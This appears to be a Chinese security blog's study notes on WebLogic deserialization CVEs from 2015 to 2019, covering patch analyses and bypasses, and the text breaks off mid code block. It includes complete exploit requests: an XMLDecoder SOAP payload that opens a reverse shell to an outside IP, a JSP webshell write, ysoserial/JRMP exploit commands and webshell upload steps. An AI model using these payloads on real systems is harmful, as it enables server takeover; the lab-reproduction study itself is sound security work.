[WebLogic系列漏洞学习之T3：CVE-2015-4852]<br>tcpdump监听，然后运行脚本抓到了t3协议的流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i any -w dump.pcap</span><br></pre></td></tr></table></figure><p>传输了序列化对象，知道ac ed 00 05是Java中序列化对象的特点，过滤下，并追踪tcp流<br><img src="../../images/java/weblogic/27.png" alt=""><br><img src="../../images/java/weblogic/28.png" alt=""><br>hex转储下，存在序列化数据<br><img src="../../images/java/weblogic/29.png" alt=""> </p><h1 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h1><p><img src="../../images/java/weblogic/31.png" alt=""><br>由于CVE-2015-4852的修复是基于黑名单的，所以我们如果能找到一个对象，其可以在自己的readObject中创建自己的InputStream的对象，这个漏洞主要是找到了个黑名单之外的类”weblogic.jms.common.StreamMessageImpl  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>.readExternal(var1);</span><br><span class="line">       <span class="keyword">byte</span> var2 = var1.readByte();</span><br><span class="line">       <span class="keyword">byte</span> var3 = (<span class="keyword">byte</span>)(var2 &amp; <span class="number">127</span>);</span><br><span class="line">       <span class="keyword">if</span> (var3 &gt;= <span class="number">1</span> &amp;&amp; var3 &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               <span class="keyword">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">               BufferInputStream var4 = <span class="keyword">this</span>.payload.getInputStream();</span><br><span class="line">               ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">               <span class="keyword">this</span>.setBodyWritable(<span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">this</span>.setPropertiesWritable(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                       <span class="keyword">this</span>.writeObject(var5.readObject());</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                   ……</span><br></pre></td></tr></table></figure><p><a href="https://github.com/5up3rc/weblogic_cmd" target="_blank" rel="noopener">weblogic_cmd工具</a>    </p><p>这个工具直接当做IDEA的工程打开即可，配置application参数<br><img src="../../images/java/weblogic/30.png" alt=""> </p><p>详情可看此文章：<a href="https://www.anquanke.com/post/id/224343" target="_blank" rel="noopener">https://www.anquanke.com/post/id/224343</a>  </p><h1 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h1><p>weblogic.corba.utils.MarshalledObject 绕过黑名单。这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes。MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MarshalledObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.hash = <span class="number">13</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ByteArrayOutputStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        MarshalledObject.MarshalledObjectOutputStream var3 = <span class="keyword">new</span> MarshalledObject.MarshalledObjectOutputStream(var2);</span><br><span class="line">        var3.writeObject(var1);</span><br><span class="line">        var3.flush();</span><br><span class="line">        <span class="keyword">this</span>.objBytes = var2.toByteArray();</span><br><span class="line">        <span class="keyword">int</span> var4 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; <span class="keyword">this</span>.objBytes.length; ++var5) &#123;</span><br><span class="line">            var4 = <span class="number">31</span> * var4 + <span class="keyword">this</span>.objBytes[var5];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.hash = var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, ObjectStreamException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.objBytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ByteArrayInputStream var1 = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.objBytes);</span><br><span class="line">        ObjectInputStream var2 = <span class="keyword">new</span> ObjectInputStream(var1);</span><br><span class="line">        Object var3 = var2.readObject();</span><br><span class="line">        var2.close();</span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详情可看此文章：<a href="https://xz.aliyun.com/t/8529" target="_blank" rel="noopener">https://xz.aliyun.com/t/8529</a>  </p><h1 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h1><p>CVE-2015-4852往后有一系列漏洞都是立足于对其补丁的绕过的，CVE-2017-3248也是其中之一。</p><p>WebLogic 使用这种黑名单的方式试图过滤掉危险的类的这种修复方式有一定的效果，但也存在被绕过的风险。根据学习，我了解到的绕过的思路有如下几种：一是找到可用且未在黑名单之内的新类（新类要能构造链实现任意代码执行），此时的payload为新的；二是找到一种类，这种类可以反序列化自身成员变量，此时可以封装旧的payload；三是找到未在黑名单之内的新反序列化点，此时可以发旧的payload。CVE-2016-3510和CVE-2016-0638主要是基于第二种思路， CVE-2017-3248 则是基于第三种思路，通过JRMP 协议达到执行任意反序列化 payload。      </p><p>漏洞利用可以使用下面CVE-2018-2628的exp</p><p>详情可看此文章： <a href="https://www.anquanke.com/post/id/225137" target="_blank" rel="noopener">https://www.anquanke.com/post/id/225137</a>  </p><h1 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h1><p>漏洞利用：<br>工具：<a href="https://github.com/ianxtianxt/CVE-2017-3506" target="_blank" rel="noopener">https://github.com/ianxtianxt/CVE-2017-3506</a>  </p><p>详情可看此文章：<a href="https://guokeya.github.io/post/TsCTC6Ohu/" target="_blank" rel="noopener">https://guokeya.github.io/post/TsCTC6Ohu/</a>   </p><p>补丁代码：<br>首先来看3506的补丁的分析，在文件 weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，<br>添加了validate方法，方法的实现如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。</p><h1 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>CVE-2017-10271与3506他们的漏洞原理是一样的,只不过10271绕过了3506的补丁,我们来看下补丁是怎么处理的。  </p><p><img src="../../images/java/weblogic/33.png" alt=""><br>图中红框内的代码是限制CVE-2017-3506漏洞利用的黑名单，这次补丁修补得非常的简陋，仅仅是根据POC中的object标签进行了修补，所以很快就出现了CVE-2017-10271漏洞。CVE-2017-10271的POC与CVE-2017-3506的POC很相似，只是将object标签换成了array或void等标签，即可触发远程代码执行漏洞。因此，在CVE-2017-10271漏洞爆发之后，Oracle官方也进行了补丁的完善，这一次的补丁考虑得比较全面，在黑名单中又添加了new,method,void,array等关键字进行漏洞修补，成功防御了CVE-2017-10271漏洞。</p><p>漏洞复现  </p><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>反弹shell：<br><img src="../../images/java/weblogic/21.png" alt="">  </p><p>写入webshell（访问：<a href="http://your-ip:7001/bea_wls_internal/test.jsp）：" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp）：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">    &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test&quot;); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    &lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;</span><br><span class="line">    &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="../../images/java/weblogic/22.png" alt="">  </p><h1 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><p>漏洞描述：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS核心组件)中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。</p><p>影响版本：10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3  </p><p> 首先我们来看以下 CVE-2017-3248 这个漏洞的补丁（p24667634_1036_Generic），在weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class多了一个resolveProxyClass，这个resolveProxyClass只是对 RMI 接口类型进行了判断，判断 RMI 接口是否为java.rmi.registry.Registry，是的话抛出错误。<br><img src="../../images/java/weblogic/32.png" alt=""><br>这里，换个RMI 接口类型即可绕过这个补丁。可以使用java.rmi.activation.Activator来替代java.rmi.registry.Registry生成payload，即可绕过这个判断限制。<br>详情可看此文章：<a href="https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/" target="_blank" rel="noopener">https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/</a> </p><p>漏洞复现<br>首先下载ysoserial，并启动一个JRMP Server：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br></pre></td></tr></table></figure><p>其中，<code>[command]</code>即为我想执行的命令，而<code>[listen port]</code>是JRMP Server监听的端口。</p><p>然后，使用exploit.py脚本，向目标Weblogic（<a href="http://your-ip:7001" target="_blank" rel="noopener">http://your-ip:7001</a> ） 发送数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br></pre></td></tr></table></figure><p>其中，<code>[victim ip]</code>和<code>[victim port]</code>是目标weblogic的IP和端口，<code>[path to ysoserial]</code>是本地ysoserial的路径，<code>[JRMPListener ip]</code>和<code>[JRMPListener port]</code>第一步中启动JRMP Server的IP地址和端口。<code>[JRMPClient]</code>是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2。</p><p>exploit.py执行完成后，执行docker-compose exec weblogic bash进入容器中，可见/tmp/success已成功创建。<br><img src="../../images/java/weblogic/20.png" alt="">  </p><p>官方放出了10271的补丁，补丁如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure><p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。 </p><h1 id="WebLogic-WLS核心组件反序列化漏洞（CVE-2018-2893）"><a href="#WebLogic-WLS核心组件反序列化漏洞（CVE-2018-2893）" class="headerlink" title="WebLogic WLS核心组件反序列化漏洞（CVE-2018-2893）"></a>WebLogic WLS核心组件反序列化漏洞（CVE-2018-2893）</h1><p>漏洞利用<br><a href="https://github.com/pyn3rd/CVE-2018-2893" target="_blank" rel="noopener">工具下载</a></p><p>详情可看 <a href="http://blog.topsec.com.cn/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E5%85%B3%E4%BA%8Ecve-2018-2893-weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析</a>    </p><h1 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h1><p>工具下载：<a href="https://github.com/pyn3rd/CVE-2018-3245" target="_blank" rel="noopener">https://github.com/pyn3rd/CVE-2018-3245</a><br><a href="https://www.chabug.org/audit/1275.html" target="_blank" rel="noopener">Weblogic JRMP反序列化及绕过分析</a>   </p><h1 id="任意文件上传漏洞（CVE-2018-2894）"><a href="#任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="任意文件上传漏洞（CVE-2018-2894）"></a>任意文件上传漏洞（CVE-2018-2894）</h1><p>漏洞描述：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS-Web服务)中的漏洞。受影响的支持版本是12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。CVSS3.0基础得分9.8(保密性、完整性和可用性影响)。Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p><p>影响版本：12.1.3.0、12.2.1.2和12.2.1.3</p><p>漏洞环境<br>执行如下命令，启动weblogic 12.2.1.3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<a href="http://your-ip:7001/console，即可看到后台登录页面。" target="_blank" rel="noopener">http://your-ip:7001/console，即可看到后台登录页面。</a></p><p>执行docker-compose logs | grep password可查看管理员密码，管理员用户名为weblogic。</p><p>登录后台页面，点击base_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项</p><p><img src="../../images/java/weblogic/2.png" alt=""></p><p>漏洞复现<br>访问<a href="http://your-ip:7001/ws_utc/config.do，设置Work" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/config.do，设置Work</a> Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p><p><img src="../../images/java/weblogic/3.png" alt=""></p><p>然后点击安全 -&gt; 增加，然后上传webshell：<br><img src="../../images/java/weblogic/4.png" alt=""><br>上传后，查看返回的数据包，其中有时间戳：<br><img src="../../images/java/weblogic/5.png" alt=""><br>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell：<br><img src="../../images/java/weblogic/6.png" alt=""></p><p>漏洞原理可看此文章：<a href="https://xz.aliyun.com/t/2458" target="_blank" rel="noopener">https://xz.aliyun.com/t/2458</a>   </p><h1 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h1><p>漏洞分析：<a href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">CVE-2019-2725 分析</a>   </p><p>详细的补丁如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 